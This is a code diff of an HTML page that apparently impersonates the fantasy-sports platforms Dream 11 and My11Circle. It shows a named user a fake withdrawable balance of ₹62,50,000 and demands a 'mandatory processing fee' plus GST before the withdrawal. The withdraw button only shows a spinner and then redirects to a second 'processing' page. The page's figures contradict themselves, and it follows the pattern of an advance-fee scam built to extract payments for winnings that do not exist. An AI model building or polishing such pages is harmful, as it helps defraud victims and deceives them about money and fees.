@@ -1,77 +1,87 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Dream 11 Withdrawal</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .card {
-      background: #fff;
-      padding: 30px 25px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-      text-align: center;
-      max-width: 360px;
-      width: 100%;
-    }
-
-    .card h1 {
-      color: #e50914;
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
-
-    .card p {
-      font-size: 18px;
-      margin: 10px 0;
-    }
-
-    .amount {
-      font-size: 24px;
-      font-weight: bold;
-      color: #2d3436;
-    }
-
-    .username {
-      color: #636e72;
-      font-size: 16px;
-    }
-
-    .btn {
-      margin-top: 25px;
-      padding: 12px 20px;
-      background: #27ae60;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 18px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    .btn:hover {
-      background: #1e8449;
-    }
-  </style>
-</head>
 <body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-crown logo-icon"></i>
+                <div class="logo-text">my 11 circle</div>
+            </div>
+            <div class="balance-container">
+                <div class="balance-label">Your Withdrawable Balance</div>
+                <div class="balance-amount">₹62,50,000</div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="section-title">
+                <i class="fas fa-wallet"></i>
+                <span>Withdraw Funds</span>
+            </div>
+            
+            <div class="highlight-box">
+                <i class="fas fa-info-circle"></i>
+                <div>Your withdrawal will be processed within 24 hours. Please ensure all details are accurate.</div>
+            </div>
+            
+            <div class="withdrawal-form">
 
-  <div class="card">
-    <h1>Dream 11 Withdrawal</h1>
-    <p class="amount">₹6,25,000</p>
-    <p class="username">User: <strong>BHOJRAJ GENIUSES 1019989</strong></p>
-    <button class="btn" onclick="window.location.href='processing.html'">Withdrawal Now</button>
-  </div>
+                <div class="form-group">
+                    <label>User Name</label>
+                    <input type="text" value="BHOJRAJ GENIUSES 1019989" readonly>
+                    <i class="fas fa-user input-icon"></i>
+                </div>
 
+                <div class="form-group">
+                    <label for="amount">Withdrawal Amount</label>
+                    <input type="text" id="amount" value="₹62,50,000" readonly>
+                    <i class="fas fa-rupee-sign input-icon"></i>
+                </div>
+                
+                <div class="withdrawal-details">
+                    <div class="detail-row">
+                        <span class="detail-label">Processing Fee</span>
+                        <span class="detail-value">₹10,000</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Tax (18% GST)</span>
+                        <span class="detail-value">₹3,600</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Amount After Charges</span>
+                        <span class="detail-value">₹62,50,000</span>
+                    </div>
+                    <div class="fee-note">
+                        <i class="fas fa-info-circle"></i> A mandatory processing fee applies to withdrawals over ₹13,600
+                    </div>
+                </div>
+                
+                <button class="btn withdraw-btn" id="withdrawBtn">
+                    <i class="fas fa-rupee-sign"></i> WITHDRAW NOW
+                </button>
+                
+                <div class="loading-spinner" id="loadingSpinner"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div>Your transactions are secure and encrypted</div>
+            <div class="security-badges">
+                <i class="fas fa-shield-alt security-badge"></i>
+                <i class="fas fa-lock security-badge"></i>
+                <i class="fas fa-fingerprint security-badge"></i>
+            </div>
+            <div style="margin-top: 10px;">© 2023 circle Sports. All rights reserved.</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('withdrawBtn').addEventListener('click', function() {
+            const spinner = document.getElementById('loadingSpinner');
+            spinner.style.display = 'block';
+            this.disabled = true;
+
+            setTimeout(() => {
+                window.location.href = 'processing2.html';
+            }, 1500);
+        });
+    </script>
 </body>
-</html>
